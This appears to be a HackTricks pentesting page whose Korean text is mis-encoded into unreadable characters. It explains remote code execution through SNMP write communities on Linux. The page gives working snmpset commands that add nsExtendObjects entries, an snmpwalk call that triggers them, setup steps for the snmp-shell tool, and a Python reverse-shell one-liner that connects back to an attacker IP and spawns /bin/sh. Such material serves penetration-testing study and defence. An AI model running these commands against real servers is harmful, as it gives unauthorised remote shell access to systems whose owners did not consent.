<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

# SNMP RCE

SNMPëŠ” ê´€ë¦¬ìê°€ ì¥ì¹˜ë‚˜ ì„œë²„ì˜ ê¸°ë³¸ êµ¬ì„±ì„ ê°„ê³¼í•  ê²½ìš° ê³µê²©ìì—ê²Œ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Linux ìš´ì˜ ì²´ì œì—ì„œ **ì“°ê¸° ê¶Œí•œ (rwcommunity)**ì´ ìˆëŠ” SNMP ì»¤ë®¤ë‹ˆí‹°ë¥¼ ì•…ìš©í•¨ìœ¼ë¡œì¨ ê³µê²©ìëŠ” ì„œë²„ì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì¶”ê°€ ëª…ë ¹ìœ¼ë¡œ ì„œë¹„ìŠ¤ í™•ì¥í•˜ê¸°

SNMP ì„œë¹„ìŠ¤ë¥¼ í™•ì¥í•˜ê³  ì¶”ê°€ ëª…ë ¹ì„ ì¶”ê°€í•˜ê¸° ìœ„í•´ **"nsExtendObjects" í…Œì´ë¸”ì— ìƒˆë¡œìš´ í–‰ì„ ì¶”ê°€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” `snmpset` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ í•„ìš”í•œ ë§¤ê°œë³€ìˆ˜ë¥¼ ì œê³µí•˜ë©´ì„œ ì‹¤í–‰ íŒŒì¼ì˜ ì ˆëŒ€ ê²½ë¡œì™€ ì‹¤í–‰í•  ëª…ë ¹ì„ í¬í•¨ì‹œí‚´ìœ¼ë¡œì¨ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## ëª…ë ¹ì–´ ì£¼ì…ì„ ìœ„í•œ ëª…ë ¹ì–´ ì‹¤í–‰

SNMP ì„œë¹„ìŠ¤ì—ì„œ ëª…ë ¹ì–´ë¥¼ ì£¼ì…í•˜ì—¬ ì‹¤í–‰í•˜ë ¤ë©´ í˜¸ì¶œëœ ì´ì§„ íŒŒì¼/ìŠ¤í¬ë¦½íŠ¸ì˜ ì¡´ì¬ì™€ ì‹¤í–‰ ê°€ëŠ¥ì„±ì´ í•„ìš”í•©ë‹ˆë‹¤. **`NET-SNMP-EXTEND-MIB`**ëŠ” ì‹¤í–‰ íŒŒì¼ì˜ ì ˆëŒ€ ê²½ë¡œë¥¼ ì œê³µí•´ì•¼ í•©ë‹ˆë‹¤.

ì£¼ì…ëœ ëª…ë ¹ì–´ì˜ ì‹¤í–‰ì„ í™•ì¸í•˜ê¸° ìœ„í•´ `snmpwalk` ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ SNMP ì„œë¹„ìŠ¤ë¥¼ ì—´ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ì¶œë ¥ì—ëŠ” ëª…ë ¹ì–´ì™€ í•´ë‹¹í•˜ëŠ” ì„¸ë¶€ ì •ë³´**ê°€ í¬í•¨ë˜ë©°, ì ˆëŒ€ ê²½ë¡œë„ í‘œì‹œë©ë‹ˆë‹¤:
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## ì£¼ì…ëœ ëª…ë ¹ ì‹¤í–‰í•˜ê¸°

**ì£¼ì…ëœ ëª…ë ¹ì´ ì½íˆë©´ ì‹¤í–‰**ë©ë‹ˆë‹¤. ì´ ë™ì‘ì€ **`run-on-read()`**ë¡œ ì•Œë ¤ì ¸ ìˆìŠµë‹ˆë‹¤. ëª…ë ¹ì˜ ì‹¤í–‰ì€ snmpwalk ì½ê¸° ì¤‘ì— ê´€ì°°ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### SNMPë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œë²„ ì‰˜ íšë“í•˜ê¸°

ì„œë²„ë¥¼ ì œì–´í•˜ê³  ì„œë²„ ì‰˜ì„ ì–»ê¸° ìœ„í•´ mxrchê°€ ê°œë°œí•œ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git)ì—ì„œ ì´ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜ëŠ”, SNMPì— íŠ¹ì • ëª…ë ¹ì„ ì£¼ì…í•˜ì—¬ ì—­ì‰˜ì„ ìˆ˜ë™ìœ¼ë¡œ ìƒì„±í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì´ ëª…ë ¹ì€ snmpwalkì— ì˜í•´ íŠ¸ë¦¬ê±°ë˜ë©°, ê³µê²©ìì˜ ê¸°ê¸°ë¡œ ì—­ì‰˜ ì—°ê²°ì„ ì„¤ì •í•˜ì—¬ í”¼í•´ì ê¸°ê¸°ë¥¼ ì œì–´í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
ì´ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ì‚¬ì „ ìš”êµ¬ì‚¬í•­ì„ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
ë˜ëŠ” ë¦¬ë²„ìŠ¤ ì‰˜:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## ì°¸ê³  ìë£Œ
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
